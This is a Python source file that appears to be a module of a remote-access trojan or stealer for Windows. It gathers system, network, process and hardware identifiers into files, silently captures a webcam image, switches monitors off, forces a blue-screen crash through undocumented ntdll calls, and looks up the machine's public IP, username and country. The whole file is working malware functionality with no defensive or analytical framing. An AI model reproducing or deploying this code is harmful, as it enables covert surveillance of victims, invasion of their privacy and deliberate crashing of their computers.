import os, time, requests, json
from PIL import ImageGrab
import pygame.camera
import pygame.image

from monitorcontrol import get_monitors
from monitorcontrol import Monitor

import ctypes

def hostinfo(opdir):
    os.popen(f"systeminfo > {opdir}\\hostinfo.txt")
    return f"{opdir}\\hostinfo.txt"

def ipconfig(opdir):
    os.popen(f"ipconfig /all > {opdir}\\ipconfig.txt")
    return f"{opdir}\\ipconfig.txt"

def tasklist(opdir):
    os.popen(f"tasklist > {opdir}\\tasklist.txt")
    return f"{opdir}\\tasklist.txt"

def hwinfo(opdir):
    hwid = os.popen("wmic csproduct get uuid").read().replace("\n", "").replace("UUID ", "")
    cpu = os.popen("wmic cpu get name").read().replace("\n", "").replace("Name ", "")
    gpu = os.popen("wmic path win32_VideoController get name").read().replace("\n", "").replace("Name ", "")
    ram = os.popen("wmic MemoryChip get Capacity").read().replace("\n", "").replace("Capacity ", "")
    disk_size = os.popen("wmic diskdrive get size").read().replace("\n", "").replace("Size ", "")

    with open(f"{opdir}\\hwinfo.txt", "w") as f:
        f.write(f"HWID: {hwid}\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nDisk Size: {disk_size}")

    return f"{opdir}\\hwinfo.txt"

def cam_img(opdir):
    pygame.camera.init()
    cameras = pygame.camera.list_cameras()

    if not cameras:
        return False

    camera = pygame.camera.Camera(cameras[0])
    camera.start()
    time.sleep(1)
    img = camera.get_image()
    pygame.image.save(img, f"{opdir}\\webcamshot.png")
    camera.stop()

def monitor(state):
    if state == "on":
        for monitor in get_monitors():
            try:
                with monitor:
                    monitor.set_power_mode(1)
            except:
                pass
    elif state == "off":
        for monitor in get_monitors():
            try:
                with monitor:
                    monitor.set_power_mode(4)
            except:
                pass

def bsod():
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xDEADDD, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))

def global_info():
    ip = requests.get("https://api.ipify.org").content.decode("utf-8")
    username = os.getlogin()
    ipdatajsonless = requests.get(f"http://ip-api.com/json/{ip}").content.decode("utf-8").replace('callback(', '').replace('})', '}')
    ipdata = json.loads(ipdatajsonless)

    country = ipdata["country"]

    return f"IP: {ip}\nUsername: {username}\nCountry: {country}"